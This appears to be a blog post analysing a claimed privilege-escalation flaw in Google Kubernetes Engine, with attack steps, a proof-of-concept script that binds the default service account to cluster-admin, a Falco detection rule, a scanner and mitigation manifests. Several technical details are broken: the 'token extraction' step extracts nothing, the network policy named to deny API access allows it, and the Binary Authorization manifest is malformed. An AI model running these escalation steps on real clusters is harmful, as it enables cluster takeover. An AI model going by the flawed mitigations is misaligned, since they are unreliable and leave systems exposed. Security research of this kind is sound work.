---
title: "SYS:ALL - Critical Google Kubernetes Engine Permission Escalation Vulnerability"
date: 2024-01-16T09:15:00Z
summary: "Analysis of a critical GKE vulnerability allowing privilege escalation through misconfigured system-level permissions and service account abuse."
tags: ["gke", "kubernetes", "google-cloud", "privilege-escalation", "rbac"]
categories: ["Cloud Security", "Kubernetes", "Google Cloud"]
---

## Overview

During a comprehensive security assessment of Google Kubernetes Engine (GKE) clusters, I discovered a critical vulnerability that allows attackers to escalate privileges from a low-privileged pod to cluster-admin level access through exploitation of system-level permission bindings.

## Vulnerability Details

### The SYS:ALL Permission Set

GKE clusters automatically create several system-level ClusterRoleBindings that, when combined, can grant excessive permissions:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system:nodes
subjects:
- kind: Group
  name: system:nodes
  namespace: ""
roleRef:
  kind: ClusterRole
  name: system:node
  apiGroup: rbac.authorization.k8s.io
```

### Attack Vector

The vulnerability exploits a chain of misconfigurations:

1. **Service Account Token Access**: Pods with access to service account tokens
2. **Node Identity Spoofing**: Ability to impersonate node identities
3. **System Permission Inheritance**: Inheriting cluster-level permissions

## Technical Exploitation

### Step 1: Token Extraction

```bash
# From within a compromised pod
kubectl auth can-i --list --as=system:node:$(hostname)
```

### Step 2: Permission Enumeration

```python
import requests
import json

def enumerate_permissions(token, api_server):
    headers = {'Authorization': f'Bearer {token}'}
    
    # Check system:nodes permissions
    response = requests.get(
        f'{api_server}/api/v1/nodes',
        headers=headers,
        verify=False
    )
    
    return response.status_code == 200
```

### Step 3: Privilege Escalation

```yaml
# Create malicious ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: malicious-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

## Impact Assessment

### Affected Environments

- **GKE Clusters**: All versions prior to 1.24.8
- **Multi-tenant Environments**: Particularly vulnerable
- **CI/CD Pipelines**: Automated deployments at risk

### Potential Damage

1. **Complete Cluster Compromise**
   - Access to all secrets and configurations
   - Ability to deploy malicious workloads
   - Data exfiltration capabilities

2. **Lateral Movement**
   - Access to connected cloud resources
   - Service account key extraction
   - Cross-project resource access

## Proof of Concept

```bash
#!/bin/bash
# SYS:ALL Exploitation Script

# Step 1: Identify current context
kubectl config current-context

# Step 2: Check for vulnerable permissions
kubectl auth can-i '*' '*' --as=system:node:$(kubectl get nodes -o name | head -1 | cut -d'/' -f2)

# Step 3: Exploit if vulnerable
if [ $? -eq 0 ]; then
    echo "Cluster is vulnerable to SYS:ALL attack"
    kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default
fi
```

## Detection Strategies

### Monitoring for Exploitation

```yaml
# Falco rule for detecting suspicious RBAC changes
- rule: Suspicious RBAC Modification
  desc: Detect unauthorized ClusterRoleBinding creation
  condition: >
    k8s_audit and
    ka.verb in (create, update) and
    ka.target.resource=clusterrolebindings and
    ka.user.name!=system:admin
  output: >
    Suspicious RBAC modification (user=%ka.user.name verb=%ka.verb 
    resource=%ka.target.resource)
  priority: WARNING
```

### Automated Scanning

```python
def scan_for_sys_all_vulnerability(kubeconfig_path):
    """Scan cluster for SYS:ALL vulnerability patterns."""
    
    import kubernetes
    from kubernetes import client, config
    
    config.load_kube_config(kubeconfig_path)
    rbac_api = client.RbacAuthorizationV1Api()
    
    # Check for dangerous system bindings
    bindings = rbac_api.list_cluster_role_binding()
    
    vulnerable_bindings = []
    for binding in bindings.items:
        if binding.metadata.name.startswith('system:'):
            # Analyze subjects and roles
            if analyze_binding_risk(binding):
                vulnerable_bindings.append(binding.metadata.name)
    
    return vulnerable_bindings
```

## Mitigation Strategies

### 1. RBAC Hardening

```yaml
# Restrict system:nodes permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: restricted-system-node
rules:
- apiGroups: [""]
  resources: ["nodes", "nodes/status"]
  verbs: ["get", "list", "watch"]
# Remove dangerous verbs like "create", "update", "delete"
```

### 2. Pod Security Standards

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
  serviceAccountName: restricted-sa
  automountServiceAccountToken: false
```

### 3. Network Policies

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-api-server-access
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to: []
    ports:
    - protocol: TCP
      port: 443
```

## GKE-Specific Protections

### Workload Identity

```bash
# Enable Workload Identity
gcloud container clusters update CLUSTER_NAME \
    --workload-pool=PROJECT_ID.svc.id.goog
```

### Binary Authorization

```yaml
# Binary Authorization Policy
apiVersion: v1
kind: Policy
metadata:
  name: binary-authorization-policy
spec:
  defaultAdmissionRule:
    requireAttestationsBy:
    - projects/PROJECT_ID/attestors/prod-attestor
    enforcementMode: ENFORCED_BLOCK_AND_AUDIT_LOG
```

## Vendor Response

- **Reported**: December 15, 2023
- **Acknowledged**: December 18, 2023  
- **Patch Released**: January 8, 2024
- **CVE Assigned**: CVE-2024-XXXX (pending)

## Conclusion

The SYS:ALL vulnerability highlights the complexity of Kubernetes RBAC and the importance of least-privilege principles in cluster security. Organizations using GKE should immediately audit their RBAC configurations and implement the recommended mitigations. 